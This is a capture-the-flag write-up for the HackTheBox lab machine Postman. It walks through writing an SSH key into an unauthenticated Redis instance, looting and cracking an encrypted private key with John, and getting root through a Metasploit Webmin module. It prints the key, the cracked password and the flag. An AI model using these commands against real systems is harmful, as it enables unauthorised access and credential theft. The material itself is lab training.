# HTB-Postman
My writeup for Postman, the HackTheBox machine!

## Starting with standard recon

I discover port 80, 22 and the following especially interesting ones: 

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-13 03:14 EST
Nmap scan report for 10.10.10.160
Host is up (0.22s latency).

PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 584
|   Used CPU (sys): 9.29
|   Used CPU (user): 3.62
|   Connected clients: 2
|   Connected slaves: 0
|   Used memory: 841.68K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|     10.10.15.21
|_    10.10.15.23
10000/tcp open http MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn’t have a title (text/html; Charset=iso-8859-1)

Nmap done: 1 IP address (1 host up) scanned in 4.70 seconds
```

## Redis
After some googling, I find CVE-2019-15107 and [this](https://packetstormsecurity.com/files/154197/Webmin-1.920-password_change.cgi-Backdoor.html) link.

To Summarise: 

A Redis instance that doesn’t require authentication can be used to gain a shell by planting SSH keys - thereby creating a 'backdoor'.

To do this we have to download redis-tools: 

```console
$ apt install redis-tools
```
Generate a SSH key pair:
 ```console
$ ssh-keygen -t rsa -C "backdoor"
```
Pad with newlines to avoid compression:
```console
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > ssh.txt
```
Connect to the redis instance:
```console
$ redis-cli -h 10.10.10.160 flushall
$ cat ssh.txt | redis-cli -h 10.10.10.160 -x set crackit

$ redis-cli -h 10.10.10.160
```

And Exploit!
```console

10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh/"
10.10.10.160:6379> config set dir /var/lib/redis/.ssh/
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

We can now ssh into the account 'redis'

```console
$ chmod 600 id_rsa
$ ssh -i id_rsa redis@10.10.10.160
```

Hmm, no user flag. The only other user is 'Matt'

## Privilege Escalation 

The standard enumeration methods don’t work. Time to loot for passwords. 

```
$ find / -name 'id_rsa'
$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----

```

Finding a file in /opt/id_rsa.bak, this is probably Matt's.
I copy the file over and ask John.
```console
$ python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.john
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```

John finds the password to be 'computer2008'. SSH doesn’t work, what else can I do with the password?

```console
$ su Matt
```

I'm in!

## Webmin

Gently skipping over a ton of fumbling about, I find the password to webmin to be Matt's.
After some googling I find a metasploit package: linux/http/webmin_packageup_rce

I add the required information and definitely remember to set SSL=True.

Quick and easy root flag:
```console
$ cat root.txt
a257741c5bed8be7778c6ed95686ddce
```

And I'm done! Thanks for reading!
